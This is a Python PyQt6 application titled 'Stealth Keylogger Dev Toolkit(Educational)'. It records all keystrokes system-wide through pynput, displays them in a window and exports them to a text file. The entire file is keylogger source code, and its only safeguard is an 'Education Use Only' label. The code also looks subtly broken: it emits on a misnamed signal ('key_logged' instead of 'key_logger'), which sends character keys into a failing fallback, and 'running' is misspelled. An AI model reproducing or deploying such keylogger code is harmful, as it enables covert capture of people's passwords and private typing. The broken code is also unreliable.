import sys

from PyQt6.QtGui import QIcon
from PyQt6.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QPushButton, QLabel,
QTextEdit, QMessageBox
)
from PyQt6.QtCore import QThread, pyqtSignal
from pynput import keyboard

class KeyLoggerThread(QThread):
    key_logger = pyqtSignal(str)

    def __init__(self, parent=None):
        super(KeyLoggerThread, self).__init__(parent)
        self.runing = True

    def run(self):
        def on_press(key):
            if not self.runing:
                return False
            try:
                self.key_logged.emit(str(key.char))
            except AttributeError:
                self.key_logger.emit(f"[{key.name}]")

        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

    def stop(self):
        self.runing = False

class KeyLoggerApp(QWidget):
    def __init__(self):
        super(KeyLoggerApp, self).__init__()
        self.setWindowTitle("Stealth Keylogger Dev Toolkit(Educational)")
        self.setGeometry(100, 100, 600, 400)
        self.setWindowIcon(QIcon("iconfile22.ico"))

        self.layout = QVBoxLayout()
        self.label = QLabel("⚠️ Education Use Only! Do not use unethically.")
        self.keylog_view = QTextEdit()
        self.keylog_view.setReadOnly(True)

        self.start_btn = QPushButton("Start Logging")
        self.stop_btn = QPushButton("Stop Logging")
        self.clear_btn = QPushButton("Clear Logs")
        self.export_btn = QPushButton("Export to TXT")

        self.layout.addWidget(self.label)
        self.layout.addWidget(self.keylog_view)
        self.layout.addWidget(self.start_btn)
        self.layout.addWidget(self.stop_btn)
        self.layout.addWidget(self.clear_btn)
        self.layout.addWidget(self.export_btn)

        self.setLayout(self.layout)

        self.thread = None
        self.logs = ""

        self.start_btn.clicked.connect(self.start_loggings)
        self.stop_btn.clicked.connect(self.stop_loggings)
        self.clear_btn.clicked.connect(self.clear_logs)
        self.export_btn.clicked.connect(self.export_logs)

    def start_loggings(self):
        if self.thread and self.thread.isRunning():
            QMessageBox.information(self, "Info", "Keylogger is already running.")
            return

        self.thread = KeyLoggerThread()
        self.thread.key_logger.connect(self.update_log)
        self.thread.start()
        QMessageBox.information(self, "Started", "Keylogger started (for educational purposes only).")

    def stop_loggings(self):
        if self.thread:
            self.thread.stop()
            self.thread.quit()
            self.thread.wait()
            QMessageBox.information(self, "Stopped", "Keylogger stopped")

    def update_log(self, key):
        self.logs += key
        self.keylog_view.setPlainText(self.logs)

    def clear_logs(self):
        self.logs = ""
        self.keylog_view.clear()

    def export_logs(self):
        with open("keylogs.txt", "w", encoding="utf-8") as f:
            f.write(self.logs)
        QMessageBox.information(self, "Exported", "Logs exported to keylogs.txt.")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = KeyLoggerApp()
    window.show()
    sys.exit(app.exec())